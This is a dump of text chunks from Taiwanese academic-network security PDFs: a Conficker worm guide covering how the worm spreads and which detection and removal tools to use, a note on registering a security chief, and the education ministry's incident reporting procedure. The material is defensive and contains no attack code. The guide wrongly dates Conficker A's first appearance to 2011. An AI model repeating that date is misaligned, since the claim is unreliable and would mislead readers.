{
    "0": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "Conficker Worm 電腦蠕蟲 簡介與建議解決方案 [此文件主要在於介紹Conficker Worm 電腦蠕蟲攻擊方式,並提供偵測方 法與解決工具,期能協助使用者解決Conficker Worm 電腦蠕蟲的問題] 101 TACERT 臺灣學術網路危機處理中心團隊製 101/9  1 Taiwan Academic Network Computer emergency Response Team(TACERT) Conficker Worm 電腦蠕蟲 簡介與建議解決方案 目錄 一、蠕蟲出現時間:.................................................................................................... 2 二、影響平台:............................................................................................................ 2 三、事件分類:............................................................................................................ 2 四、Conficker Worm 簡介:...................................................................................... 2 五、Conficker Worm 攻擊手法:.............................................................................. 3 六、Conficker Worm 偵測方式:.............................................................................. 4 1. 網頁檢測方式:.............................................................................................. 4 2. Microsoft Baseline Security Analyzer.................................................. 4 3. McAfee Conficker Detection Tool 1.0.8................................................ 8 七、Conficker Worm 感染後解決方案 ..................................................................... 11 工具1:Microsoft Windows Malicious Software Removal Tool(MSRT) ......... 11 工具2:NOD32 EConfickerRemover................................................................. 15 工具3:SysClean-WORM_DOWNAD....................................................................... 16 工具4:Kidokiller........................................................................................... 18 八、結論:.................................................................................................................. 19 九、參考資料:.......................................................................................................... 19  2 Taiwan Academic Network Computer emergency Response Team(TACERT) Conficker Worm 電腦蠕蟲 簡介與建議解決方案 一、蠕蟲出現時間: 2011 年11 月21 日 首次出現Conficker A 二、影響平台: Windows2000/2003/XP/Vista/2008 三、事件分類: INT 對外攻擊 四、Conficker Worm 簡介: Conficker 主要利用Windows 平台的MS08-067 漏洞感染主機,感染之後 Conficker 會將自己安裝成為主機的常駐程式,並且封鎖系統和防毒軟體的 更新,感染Conficker 的主機由於這個原因,會連不上Windows 以及防毒的 更新頁面,使得偵測上極為困難。 Confi",
        "Page_Num": "1,2,3"
    },
    "1": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "cker 特點: 目前產生5 種變種分別定義為Conficker A~E 1. 感染途徑: .網路感染:NetBIOS,使用MS08-067 漏洞 .可移動媒體:USB 隨身碟 2. 更新方式: .Http 更新 .網路更新:NetBIOS,使用MS08-067 漏洞 .P2P 更新  3 Taiwan Academic Network Computer emergency Response Team(TACERT) 五、Conficker Worm 攻擊手法: 感染途徑一開始只有MS08-067 漏洞一種,隨著時間過去Conficker 出現了 很多變種。修補完MS08-067 漏洞的主機並不能保證就不會被Conficker 感 染,某些Conficker 變種能透過網路分享,對設定弱密碼的電腦進行密碼猜 測,然後感染之,或是透過USB 的自動播放進行感染。 電腦在感染Conficker 後會連接到一個伺服器接收進一步傳播的命令、收集 個人信息和下載並安裝附加的惡意程序到受害人的電腦中。它還會把自己添 加到Windows 中必須執行的程序中,像是svchost.exe,explorer.exe 和 services.exe。 而Conficker 的B/C 變種則會開啟Http 服務並打開一個1024 到10000 之間 的PORT。如果遠程機被利用成功的情況下,受害者將會連接這個Http 服務 並下載一個病毒副本,它將會重置系統還原點並下載文件到電腦中。 Conficker 變種還會自行破解使用簡單密碼做保護的網路分享,然後將惡意 程式複製到網路分享資料夾之後,再感染其他使用者。此外還會嘗試透過可 攜式儲存設備(如USB)擴大感染範圍。 圖1. Conficker 感染途徑說明圖(圖片來源:微軟網站)  4 Taiwan Academic Network Computer emergency Response Team(TACERT) 六、Conficker Worm 偵測方式: 1. 網頁檢測方式: 網址:http://www.confickerworkinggroup.org/infection_test/cfeyechart.html 說明:直接連線該網頁,透過網頁上面顯示之圖片可了解目前電腦感染 狀況。如果上面三張圖片有全部無法顯示代表",
        "Page_Num": "3,4,5"
    },
    "2": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "電腦可能感染Conficker C 或更新變種,只能顯示部分圖片代表電腦可能感染Conficker A/B。然而, 若自身的電腦有使用PROXY 的話,便無法非常準確的判別。 2. Microsoft Baseline Security Analyzer 網址: http://www.microsoft.com/en-us/download/details.aspx?id=7558 說明:Microsoft Baseline Security Analyzer (MBSA) 能讓系統管理 員掃描本機和遠端系統,偵查任何缺少安全性更新以及一般安全性設定 錯誤的狀況。安裝說明: Step1. 下載MBSA  5 Taiwan Academic Network Computer emergency Response Team(TACERT) Step2. 依指示安裝MBSA Step3-1. 執行MBSA  6 Taiwan Academic Network Computer emergency Response Team(TACERT) Setp3-2. 使用預設掃瞄選項 Step3-3. 掃瞄完畢後,紅色為必要修正項目,點選「Result details」可看 更詳細資訊  7 Taiwan Academic Network Computer emergency Response Team(TACERT) Step3-4. 點選「Description」能連結到各個修正項目詳細資訊並進行下 載。  8 Taiwan Academic Network Computer emergency Response Team(TACERT) 3. McAfee Conficker Detection Tool 1.0.8 網址: http://downloadcenter.mcafee.com/products/tools/foundstone/conficker_detectio n_tool_v108.zip 說明:掃描網域中是否有電腦感染Conficker 蠕蟲的工具。其介面十分簡單, 操作容易,可檢查出近期的.b/.c/.e 變種Conficker。 使用說明: Step1. 下載後解壓縮無需安裝直接執行  9 Taiwan Academic Network Computer emergency Response Team(TACERT) A. 首先是設定掃描的範圍,介面的中間部分有一個IPs 的區塊 1. Hostname/IP:此處基本上不用更改,軟體會自行偵測 2. Start IP:網域區段的起始IP 3. End IP:網域區段的結束IP 輸入完畢按右邊的「->」導入掃描範圍。您也可以將某些IP 從掃描清單中 移除,選擇清單中欲刪除的IP 再按下Clear Selected 的按鈕即可。若要全部 清空,",
        "Page_Num": "5,6,7,8,9,10"
    },
    "3": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "按下Clear All 的按鈕。 B. 設定完IP 後,就可以進行掃描,下面列出可供選擇的掃描選項: 1. Randomize scan order:掃描順序為隨機 2. Ping before checking (no response no check):在檢查前先Ping 這 個IP 看看有沒有反應,有回應則檢查,無回應則略過不檢查 3. Show both infected and not infected systems:將感染及未受感染的電 腦都顯示出來。 4. Show non-responding systems:顯示對Ping 封包沒有回應的電腦 5. Resolve IP addresses to names:將IP 反解成主機名稱 6. Send message to infected systems:對受感染的電腦送出訊息。  10 Taiwan Academic Network Computer emergency Response Team(TACERT) C. 設定完成後,按下 的按鈕,就可以開始掃描了,下圖是它的掃描 畫面:  11 Taiwan Academic Network Computer emergency Response Team(TACERT) 七、Conficker Worm 感染後解決方案 1. 進行作業系統更新,建議更新作業系統至最新修正。如有更新限制,至 少更新MS08-067 漏洞。 2. 關閉共享資料夾或修改共享資料夾密碼(請注意使用符合密碼複雜性原 則,如採用數字文字混雜的密碼,像是A1H6,以避免過於簡單的密碼 遭蠕蟲破解) 3. 使用工具進行清除,接下來將介紹幾種清除工具,協助清除Conficker 蠕蟲。 工具1:Microsoft Windows Malicious Software Removal Tool(MSRT) 網址:http://www.microsoft.com/security/pc-security/malware-removal.aspx 適用平台:Windows 7/ Windows Server 2003/ Windows Vista/ Windows XP 使用說明: Step1. 下載MSRT  12 Taiwan Academic Network Computer emergency Response Team(TACERT) Step2-1. 執行MSRT,於執行中輸入「MRT」即可執行MSRT Step2-2. MSRT 執行畫面  13 Taiwan Academic Network Computer emergency Response Team(TACERT) Step2-3. 選擇掃瞄模式 Step2-4. 掃瞄結果,點選「檢視掃描的詳細結果」可得知相關訊息。  14 Taiwan Academic Network Computer emergency Response Team(TACERT) Step2-5. 從詳細結果中可得知此工具除可清除Conficker 以外,尚可清除",
        "Page_Num": "10,11,12,13,14,15"
    },
    "4": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "其 他惡意程式。 .  15 Taiwan Academic Network Computer emergency Response Team(TACERT) 工具2:NOD32 EConfickerRemover 網址:http://download.eset.com/special/EConfickerRemover.exe 適用平台:Windows XP/Windows Vista/Windwos 7 使用說明: Step1. 下載後無需安裝直接執行 此程式有參數可以使用,若要使用參數,必須自行開啟「命令提示字元」,並切 換路徑到執行檔放置的位置,假設removaltool.exe 放在C 槽底下,切換到[C:\\] 後,鍵入執行檔名稱,並在執行檔後面加上參數,例如: C:\\removaltool.exe -autoclean 表示在執行程式的時候自動清除,參數共有下面三種: 1. -autoclean:不再進行確認而直接進行清除的動作。 2. -reboot:清理完成後重新開機。 3. -force:強制將疑似為Conficker 蠕蟲的執行序刪除。  16 Taiwan Academic Network Computer emergency Response Team(TACERT) 工具3:SysClean-WORM_DOWNAD 網址: http://www.trendmicro.com/ftp/products/pattern/spyware/fixtool/SysClean-WOR M_DOWNAD.zip 適用平台: Windows 2000/Windows XP/Windwos Server 2003/Windows Vista/Windwos 7 使用說明: Step1. 下載後解壓縮後得到三個檔案無需安裝直接執行 Step2. 執行「Syscl3@n」  17 Taiwan Academic Network Computer emergency Response Team(TACERT) Step3. 按下Scan 就會開始掃描 Step4. 掃描完成後會出現兩個資料夾「debug」和「report」,比較重要的是 Report 這個資料夾,裡面會有一份文件檔,內容空白的就是表示沒威脅。  18 Taiwan Academic Network Computer emergency Response Team(TACERT) 工具4:Kidokiller 網址:http://www.kaspersky.com/virus-removal-tools 適用平台: Windows 2000/Windows XP/Windwos Server 2003/Windows Vista/Windwos 7/Windows Server 2008 使用說明: Step1. 下載程式後執行 Step2. 執行",
        "Page_Num": "15,16,17,18,19"
    },
    "5": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "後會出現一個DOS 畫面,程式會自動運行,運行完畢產生下列 畫面 要注意紅色框框裡的資訊,筆者目前的機器是沒有偵測出任何威脅,如果有 偵測出的蠕蟲,數字就產生變動。  19 Taiwan Academic Network Computer emergency Response Team(TACERT) 八、結論: Conficker Worm 是一個行之有年的電腦蠕蟲,主要是透過網路分享和系統漏 洞進行系統入侵的方式,且經過多年的傳播也產生多種變種。但平時如果能 持續進行作業系統更新及安裝相關防護軟體,亦可避免該電腦蠕蟲感染及散 播。 九、參考資料: (一)[Conficker] http://en.wikipedia.org/wiki/Conficker (二)[針對近期的Conficker 蠕蟲,微軟今天發佈最新的版本惡意軟體移除 工具] http://www.microsoft.com/taiwan/security/articles/msrt0114.mspx (三)[Microsoft Security Bulletin MS08-067 – 重大] http://technet.microsoft.com/zh-tw/security/bulletin/ms08-067 (四)[Conficker Eye Chart] http://www.confickerworkinggroup.org/infection_test/cfeyechart.html (五)[Microsoft Baseline Security Analyzer 2.2(for IT Professionals] http://www.microsoft.com/en-us/download/details.aspx?id=7558 (六)[ McAfee Conficker Detection Tool] http://downloadcenter.mcafee.com/products/tools/foundstone/ conficker_detection_tool_v108.zip (七) [Malicious Software Removal Tool] http://www.microsoft.com/security/pc-security/malware-removal.aspx (八)[ NOD32 EConfickerRemover] http://download.eset.com/special/EConfickerRemover.exe (九)[ SysClean-WORM_DOWNAD] http://www.trendmicro.com/ftp/products/pattern/spyware/fixtool/ SysClean-WORM_DOWNAD.zip (十)[ Kidokiller] http://www.kaspersky.com/virus",
        "Page_Num": "19,20"
    },
    "6": {
        "File_Name": "Conflicker檢測管理流程.pdf",
        "content": "-removal-tools ",
        "Page_Num": "20"
    },
    "7": {
        "File_Name": "csoperosn.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資安通報平台資安長資訊說明 依據資通安全管理法第11 條規定:資通安全長由機關首長指 派副首長或適當人員兼任,負責推動及監督機關內資通安全 相關事務。 1. 請單位的資安連絡人登錄「教育機構資安通報平台」 (https://info.cert.tanet.edu.tw)後,點選左方功能列(圖1)之「修改資 安長資料」功能項。 圖1. 教育機構資安通報平台左方功能列 2. 輸入單位的資安長相關連絡資訊(包含資安長姓名、資安長公務電 話及資安長公務e-mail),點選「送出」以儲存資料。 圖2.修改資安長資訊功能截圖 ",
        "Page_Num": "1"
    },
    "8": {
        "File_Name": "eventreport.pdf",
        "content": "臺灣學術網路各級學校 資通安全通報應變作業程序 (核定本) 教育部 中華民國108 年4 月  1 目 錄 第1 章 前言 .......................................................................................................................................... 2 第2 章 整體作業 .................................................................................................................................. 3 一、 臺灣學術網路通報應變架構 ........................................................................................ 3 二、 資通安全事件等級 ........................................................................................................ 4 三、 通報及應變作業流程 .................................................................................................... 5 第3 章 通報作業 .................................................................................................................................. 7 一、 臺灣學術網路轄下各級學校、學術機構及連線單位 ................................................ 7 二、 區、縣(市)網路中心 ................................................................................................ 7 三、 通報應變小組 ................................................................................................................ 8 第4 章 應變作業 .................................................................................................................................. 9 一、 各級學校、學術機構及連線單位 ................................................................................ 9 二、 區縣(市)教育網路中心 .......................................................................................... 11 三、 各級學校資安通報應變小組 ...................................................................................... 11 第5 章 資安演練作業 ........................................................................................................................ 12 一、 資通安全通報演練 ...................................................................................................... 12 二、 防範惡意電子郵件社交工程演練 .............................................................................. 13 第6 章 獎勵及減責標準 .................................................................................................................... 14 一、 獎勵標準 ...................................................................................................................... 14 二、 權責 .............................................................................................................................. 14 三、 減責標準 ...................................................................................................................... 14 附件一 區(縣)市教育網路中心列表 ............................................................................................ 15 附件二 臺灣學術網路之各單位資通安全事件通報單 .................................................................... 16  2 第1 章 前言 本部為求有效掌握臺灣學術網路(以下簡稱TANet)各級學校、教育及研究 機構之資通系統發生資通安全事件(以下簡稱資安事件)時,能迅速通報及緊急 應變處置,以確保臺灣學術網路各級學校之正常運作,並符合「資通",
        "Page_Num": "1,2,3"
    },
    "9": {
        "File_Name": "eventreport.pdf",
        "content": "安全管理法」 相關規範,使各單位人員能快速掌握處理原則,特訂定「臺灣學術網路各級學校 資通安全通報應變作業程序」(以下簡稱本作業程序)。本作業程序不適用本部及 所屬機關(構)。 本作業程序分為6 章,除前言外,依整體作業、通報作業、應變作業、資安 演練作業、獎懲及減責標準等逐項規範或說明。其中「整體作業」包括臺灣學術 網路通報應變架構暨各單位角色職掌、資安事件等級定義及作業流程,明確規範 資安事件發生時之通報應變作業程序;「通報作業」含各級學校、教育及研究機構 之通報作業方式及要求;「應變作業」說明各級學校、教育及研究機構之事前安全 防護、事中緊急應變、事後復原作業之具體機制及相關應變作業檢討等;「資安演 練作業」敘述通報應變小組應辦理之相關資通安全演練作業,據以檢驗區、縣(市) 網路中心及所屬連線單位之資安通報機制及應變能力;「獎懲及減責標準」則規 範提報獎勵標準、懲處規定及減責規定等。  3 第2 章 整體作業 一、 臺灣學術網路通報應變架構 臺灣學術網路以支援全國各級學校、研究機構間之教學與學術研究活動及教 育行政應用服務為目的,其管理組織依序分為下列三個層級,架構如圖一所示。 (一) 臺灣學術網路管理會:設立於本部,其幕僚作業由本部資訊及科技教 育司辦理。 (二) 縣(市)教育網路中心及區域網路中心:由各直轄市、縣(市)政府 設立縣(市)教育網路中心,十三所大學則分別設立區域網路中心。 (三) 連線臺灣學術網路各級學校(以下簡稱連線單位)。 圖一、臺灣學術網路通報應變架構 本作業程序各單位角色及執掌說明如下: (一) 第一線人員:指各連線單位之網管、資安人員,其職掌範圍為其所管 轄單位之資安事件通報與處理。各",
        "Page_Num": "3,4"
    },
    "10": {
        "File_Name": "eventreport.pdf",
        "content": "單位應配置2 名人員以求資安事件 處理之有效。 (二) 第二線人員:指各縣(市)教育網路中心及區域網路中心之網管、資 安人員,職掌範圍為審核連線單位之資安事件、協助第一線人員資安 事件之處理。區、縣(市)網人員應配置2 名人員以求資安事件處理 之效果。 (三) 各級學校資安通報應變小組(以下簡稱通報應變小組):指臺灣學術網 路危機處理中心(TACERT),職掌範圍為負責各級學校資安通報平台 之營運,審核所有資安事件,協調資安事件通報、處理與支援事項。 (四) 教育部人員:指教育部資訊及科技教育司(以下簡稱本部資科司),職 掌範圍為指揮與監督重大資安事件之通報應變。  4 二、 資通安全事件等級 本作業程序依據「資通安全事件通報及應變辦法」將資通安全事件分為四 級,由重至輕分別為「4 級」、「3 級」、「2 級」及「1 級」,另新增資安預警事件 類別。 (一) 4 級事件 符合下列任一情形者,屬4 級事件: 1. 一般公務機密、敏感資訊或涉及關鍵基礎設施維運之核心業務資 訊遭嚴重洩漏,或國家機密遭洩漏。 2. 一般公務機密、敏感資訊、涉及關鍵基礎設施維運之核心業務資 訊或核心資通系統遭嚴重竄改,或國家機密遭竄改。 3. 涉及關鍵基礎設施維運之核心業務或核心資通系統之運作受影響 或停頓,無法於可容忍中斷時間內回復正常運作。 (二) 3 級事件 符合下列任一情形者,屬3 級事件: 1. 未涉及關鍵基礎設施維運之核心業務資訊遭嚴重洩漏,或一般公 務機密、敏感資訊或涉及關鍵基礎設施維運之核心業務資訊遭輕 微洩漏。 2. 未涉及關鍵基礎設施維運之核心業務資訊或核心資通系統遭嚴重 竄改,或一般公務機密、敏感資訊、涉及關鍵基礎設施維",
        "Page_Num": "4,5"
    },
    "11": {
        "File_Name": "eventreport.pdf",
        "content": "運之核 心業務資訊或核心資通系統遭輕微竄改。 3. 未涉及關鍵基礎設施維運之核心業務或核心資通系統之運作受影 響或停頓,無法於可容忍中斷時間內回復正常運作,或涉及關鍵 基礎設施維運之核心業務或核心資通系統之運作受影響或停頓, 於可容忍中斷時間內回復正常運作。 (三) 2 級事件 符合下列任一情形者,屬2 級事件: 1. 非核心業務資訊遭嚴重洩漏,或未涉及關鍵基礎設施維運之核心 業務資訊遭輕微洩漏。 2. 非核心業務資訊或非核心資通系統遭嚴重竄改,或未涉及關鍵基 礎設施維運之核心業務資訊或核心資通系統遭輕微竄改。  5 3. 非核心業務之運作受影響或停頓,無法於可容忍中斷時間內回復 正常運作,或未涉及關鍵基礎設施維運之核心業務或核心資通系 統之運作受影響或停頓,於可容忍中斷時間內回復正常運作。 (四) 1 級事件 符合下列任一情形者,屬1 級事件: 1. 非核心業務資訊遭輕微洩漏。 2. 非核心業務資訊或非核心資通系統遭輕微竄改。 3. 非核心業務之運作受影響或停頓,於可容忍中斷時間內回復正常 運作,造成機關日常作業影響。 (五) 資安預警事件 凡屬有待受害單位進行確認之資安事件皆屬於資安預警事件,說明如 下: 1. 未確定事件或待確認事件單:來自北區教育學術資訊安全監控中 心(N-ASOC)、南區教育學術資訊安全監控中心(S-ASOC)、縣市 網資訊安全維運中心(MINI-SOC)使用之新型技術所產生之事件 單,但正確性有待確認者。 2. 其他單位所告知教育部所屬單位所發生未確定之資安事件。 三、 通報及應變作業流程 資通安全事件通報及應變流程如圖2 所示,相關作業程序請參見「第2 章 通報作業」及「",
        "Page_Num": "5,6"
    },
    "12": {
        "File_Name": "eventreport.pdf",
        "content": "第3 章 應變作業」。  6 圖二、各級學校通報及應變流程 各單位通報資安事件或進行結案,以及區域網路中心及縣市教育網路中心審 核所屬連線單位資安事件通報或結案時,均須至各級學校資安通報平台(以下簡 稱通報應變網站)登錄作業,該網站營運維護、資安事件通報管理、技術諮詢及支 援等服務,由本部委託臺灣學術網路危機處理中心負責,聯繫資訊如下: (一)網址:https://cert.tanet.edu.tw (二)聯絡電話:(07)525-0211 (三)網路電話:98400000 (四)電子郵件:service@cert.tanet.edu.tw  7 第3 章 通報作業 一、 臺灣學術網路轄下各級學校、學術機構及連線單位 (一) 各連線單位通報範圍應包含自建或委外之資通系統。 (二) 各連線單位發現資安事件後可先進行事件確認,經確認為資安事件後, 須於1 小時內,至通報應變網站通報登錄資安事件細節、影響等級及是 否申請支援等資訊,並評估該事件是否影響其他連線單位運作。 (三) 如因網路或電力中斷等事由,致使無法上網填報資安事件,須於確認資 安事件條件成立後1 小時內,與所屬區、縣(市)網路中心及通報應變 小組聯繫,先行提供事件細節,待網路通訊恢復正常後,仍須至通報應 變網站補登錄通報。 (四) 「4」、「3」級資安事件須於36 小時內完成損害控制或復原;「2」、 「1」級資安事件須於72 小時內完成損害控制或復原。 (五) 完成資安事件處理後,須至通報應變網站通報結案,並登錄資安事件處 理過程及完成時間。 (六) 「2」、「1」級資安事件通報應變完成後,應至通報應變網站列印單件, 每月彙整送呈單位主管;「4」、「3」級資安事件需於事件發生後36 小 時內,通報送陳單位",
        "Page_Num": "6,7,8"
    },
    "13": {
        "File_Name": "eventreport.pdf",
        "content": "資通安全長。 (七) 「4」、「3」級資安事件依本項規定完成損害控制或復原作業後,應持 續進行資通安全事件之調查及處理,並於一個月內將調查、處理及改善 報告函送本部,由本部彙送主管機關。 (八) 各單位如因網路問題無法通報,可填寫「臺灣學術網路各級學校資通安 全事件通報單」以傳真或電子郵件方式送至「臺灣學術網路危機處理中 心」進行通報。 二、 區、縣(市)網路中心 (一) 區、縣(市)網路中心在接獲所屬連線單位通報後,應主動掌握事件狀 況、協助所屬連線單位進行資安事件應變處理,並督導事件處理過程。  8 針對「4」、「3」級資安事件,區、縣(市)網路中心將主動通知通報 應變小組,以利通報應變小組評估事件影響及通報本部資科司。 (二) 區、縣(市)網路中心須至通報應變網站審核所屬連線單位通報之資安 事件,並評估該事件是否影響其他連線單位運作以及事件影響等級之合 理性,視需要申請技術支援。若資安事件屬「4」、「3」級事件,須於 通報後2 小時內完成審核;「2」、「1」級事件,則須於通報 8 小時內 完成審核。 (三) 若各連線單位完成資安事件處理,應至通報應變網站通報結案。針對「4」、 「3」級資安事件,區、縣(市)網路中心於接獲所屬連線單位結案申 請,除至通報應變網站審核所屬連線單位資安事件結案內容外,尚需對 於該資安事件填寫應配合辦理事項或規劃相關作業。 三、 通報應變小組 (一) 通報應變小組依據各連線單位及其區、縣(市)網路中心通報之資訊, 評估通報內容及事件等級合理性,並得視需要變更事件等級,如區、縣 (市)網路中心未能於規定時限內完成通報審核,得逕行通知完成審核。 (二) 區、縣(市)網路",
        "Page_Num": "8,9"
    },
    "14": {
        "File_Name": "eventreport.pdf",
        "content": "中心申請技術支援時,通報應變小組須於完成複核後, 聯繫區、縣(市)網路中心確認技術支援事項,並通報本部資科司及協 調提供技術支援方式。 (三) 通報應變小組應彙整各級資安事件,定期提供至本部資科司;如接獲「4」、 「3」級資安事件,應通報本部資科司。經本部確認級別後一小時內, 依行政院指定方式及對象,進行資通安全事件通報,俾供研析相關因應 作為。 (四) 「4」、「3」級資安事件,本部資科司得依事件情形邀集相關處理單位, 召開緊急應變會議;必要時逐級陳報至本部資通安全長,召開資安防護 會議。  9 第4 章 應變作業 一、 各級學校、學術機構及連線單位 各連線單位應建立資安事件之「事前安全防護」、「事中緊急應變」及「事後 復原」作業之具體機制,並至少包含下列各項: (一) 事前安全防護 1. 核心資訊系統應依「資通安全責任等級分級辦法」第11 條或本部 訂定之相關資安規定進行盤點作業,判定資訊系統安全防護等級, 並據以落實資安防護基準。 2. 應規劃建置資通安全整體防護環境,做好內部資料存取控制,對 於機敏文件、資料及檔案等應採取加密或實體隔離等防護措施。 3. 應訂定災害預防、緊急應變程序、復原計畫等防護措施並定期演 練,以建立緊急應變能量。 4. 應依資通安全防護需要,執行入侵偵測、安全檢測及弱點掃描等 安全檢測工作,並訂定系統與資料備份管理辦法,以做好事前防 禦準備。 5. 應實施資通安全稽核、網路監控及人員安全管理等機制,以強化 資通安全整體防護能力,降低安全威脅及災害損失。 6. 應保留資安紀錄與備份,如資訊系統屬委外建置管理者,應於合 約內要求承商保留相關資安紀錄。 7. 應針對上述建立資通安全防護",
        "Page_Num": "9,10"
    },
    "15": {
        "File_Name": "eventreport.pdf",
        "content": "環境及相關措施,列入年度定期稽 核項目,定期實施內部稽核,以儘早發現系統安全弱點並完成修 復補強。 8. 應建置並保存相關設備之系統日誌。 9. 應每年定期規劃辦理資安認知教育訓練。 (二) 事中緊急應變 1. 應就資安事件發生原因、影響等級、可能影響範圍、可能損失及是 否需要支援等項目逐一檢討與處置,並保留被入侵或破壞相關證 據。  10 2. 依訂定之緊急應變程序,實施緊急應變處置,並持續監控與追蹤 管制。 3. 查詢臺灣學術網路危機處理中心網站、系統弱點(病毒)資料庫或 聯絡技術支援單位(廠商)等方式,以尋求解決方案;如無法解決, 應儘速向所屬區、縣(市)網路中心及通報應變小組反應,請求提 供相關技術支援。 4. 評估資安事件對業務運作造成之衝擊,並進行損害管制。若未納 入各單位防護範圍之資訊系統發生資安事件,為防止損害擴大影 響他人或正常使用者之權益,依據「臺灣學術網路管理規範」,各 單位得先行中斷發生資安事件之系統網路連線,待該系統完成通 報應變改善作為後,始得恢復其連線。 5. 資安事件損壞程度,請遵循各單位內部備份管理辦法,啟動備援 計畫、異地備援或備援中心等應變措施,以防止事件擴大。 6. 資安事件如涉及刑責,應做好相關資料(含稽核紀錄)保全工作, 以便聯繫檢警調單位協助偵查。 7. 各連線單位如發生重大(「4」、「3」級)資安事件,應主動提供相關 設備系統日誌予所屬區、縣(市)網路中心及通報應變小組,俾提 供相關協助。 (三) 事後復原 1. 在執行復原重建工作時,應執行環境重建、系統復原及掃描作業, 俟系統正常運作後,即進行安全備份及資料復原等相關事宜。 2. 在完成復原重建工作後,應將復原過程之完整紀錄(如資安事件原 因分析與檢討改善方案",
        "Page_Num": "10,11"
    },
    "16": {
        "File_Name": "eventreport.pdf",
        "content": "、防止同類事件再次發生之具體方案、稽 核軌跡及蒐集分析相關證據等資料),予以建檔管制,以利爾後查 考使用。 3. 全面檢討網路安全措施、修補安全弱點、修正防火牆設定等具體 改善措施,以防止類似入侵或攻擊情事再度發生,並視需要修訂 應變計畫。  11 二、 區縣(市)教育網路中心 區縣(市)教育網路中心應於資安事件處理完成後,針對以下項目進行應變 作業檢視。 (一) 作業程序:檢視人員辦理通報作業的熟悉程度與程序是否適當。 (二) 事件處理:檢視人員事件應變處理措施是否適當。 三、 各級學校資安通報應變小組 如重大(「4」、「3」級)資安事件經資安防護會議評估資安事件涉及下列事項 時,經由本部資科司提報行政院國家資通安全會報,啟動相關應變機制,以控管 損害。 (一) 涉及網路犯罪相關議題。 (二) 對關鍵基礎設施(Critical Infrastructure, CI)造成威脅時。 (三) 對國家安全造成威脅時。  12 第5 章 資安演練作業 一、 資通安全通報演練 (一) 演練目的:檢驗「區、縣(市)網路中心」及所屬連線單位之資安通 報機制及應變能力。 (二) 演練時間:每年辦理1 次,確實執行日期由通報應變小組提報演練計 畫至本部資科司核定,惟須於每年9 月底前完成。 (三) 一般說明: 1. 本項演練作業,應分組分工執行各項任務。如平台準備及問題處理 小組負責「各級學校資安通報演練平台」維護、規劃演練各項事宜 及問題處理;危機處理小組負責規劃演練各種模擬狀況及處理突發 狀況;安全預防小組負責規劃參演單位及支援演練計畫執行處理作 業;演練單位針對演練模擬事件,研擬應變處理作為,並於「各級 學校資安通報演練平台」回復應變處理作為,組織架構如圖三所 示。 ",
        "Page_Num": "11,12,13"
    },
    "17": {
        "File_Name": "eventreport.pdf",
        "content": "圖三、資通安全通報演練組織架構 2. 演練計畫應簽奉本部資科司核定後實施。 3. 遴選演練對象方式,由平台準備及問題處理小組提交單位清單供安 全預防小組選取參與演練單位。 教育部資訊安全長 指導人員 (資訊及科技教育司 司長、副司長) 平台準備及 問題處理小組 (TACERT計畫團隊) 危機處理小組 (教育部資訊及科技 教育司) 安全預防小組 (教育部資訊及科技 教育司) 演練單位 部屬機關(構)、區、縣 (市)網路中心、各級學 校  13 4. 演練前,平台準備及問題處理小組預先規劃各級資安事件之各種模 擬狀況(至少10 種以上),提交危機處理小組複核。演練時採隨機 選取方式,分配予參與演練單位。 5. 演練完成後將「演練事件紀錄」提交至本部資科司備查,並由平台 準備及問題處理小組彙整統計演練成果報告,供本部資科司研商辦 理獎勵及改善事宜。 二、 防範惡意電子郵件社交工程演練 (一) 演練目的:提高「區、縣(市)網路中心」及其所屬連線單位對社交 工程攻擊防制認知。 (二) 演練時間:每年不定期至少辦理二次,由本部資科司規劃及執行,惟 須於每年4 月底前辦理第1 次演練,並於9 月底前辦理第2 次演練。 (三) 一般說明: 1. 演練對象由本部資科司決定,惟區縣(市)教育網路中心及所屬連 線單位具有公務電子郵件人員,須1/4(含)以上參與演練。 2. 演練實施前須訂定演練計畫,簽奉本部資通安全長核定。 3. 完成演練作業後,演練報告經本部資通安全長核定,並於每次演練 完成後1 個月內主動送行政院國家資通安全會報備查。  14 第6 章 獎勵及減責標準 一、 獎勵標準 (一) 公務機關依「公",
        "Page_Num": "13,14,15"
    },
    "18": {
        "File_Name": "eventreport.pdf",
        "content": "務機關所屬人員資通安全事項獎懲辦法」辦理。 (二) 非公務機關就其所屬人員辦理業務涉及資通安全事項之獎勵,得依 「公務機關所屬人員資通安全事項獎懲辦法」之規定,自行訂定相關 基準。 二、 權責 具以下情事之一者,由本部資科司建議相關單位視情節輕重對所屬人員予以 適度追究相關責任: (一) 校內發生資安事件,隱匿未向上級機關進行通報者。 (二) 各校轄下單位之資通系統,若包含教、職、員、生可識別之個人資 料,則該系統資料持有單位應確實評估風險,主動加以防護或納入校 內核心系統給予應有之級別防護。若因未適當防護,致使該資通系統 發生資安事件影響他人權益,資料持有單位應負相關責任。 (三) 未遵循本作業程序規定落實資安事件通報應變作業及提供資安紀錄, 致國家或社會受有重大損害時,依法追訴行為人涉及湮滅證據等相關 刑事責任;此外另追究行為人、其主責單位及相關人員之行政責任。 三、 減責標準 遵循本作業程序規定確實辦理資安事件通報及應變作業並提供資安紀錄,仍 致政府或民眾權益受損時,區(縣)市教育網路中心及通報應變小組應協助提供 資料予本部資科司,並建議減輕其責。  15 附件一 區(縣)市教育網路中心列表 編號 機關名稱 編號 機關名稱 1 基隆市教育網路中心 2 新北市教育網路中心 3 臺北市教育網路中心 4 桃園市教育網路中心 5 新竹縣教育研究發展暨網路中心 6 新竹市教育網路中心 7 苗栗縣教育網路中心 8 臺中市教育網路中心 9 彰化縣教育網路中心 10 南投縣教育網路中心 11 雲林縣教育網路中心 12 嘉義縣教育網路中心 13 嘉義市教育網路中心 14 臺南市政府教育局資訊中心 15 高雄市政府教育局資訊教育中心 16 屏東縣教育網路中心 17 宜蘭縣教育網路中心 18 花蓮縣教育網路中心 19 臺東縣教育網路中心 20 澎湖縣",
        "Page_Num": "15,16"
    },
    "19": {
        "File_Name": "eventreport.pdf",
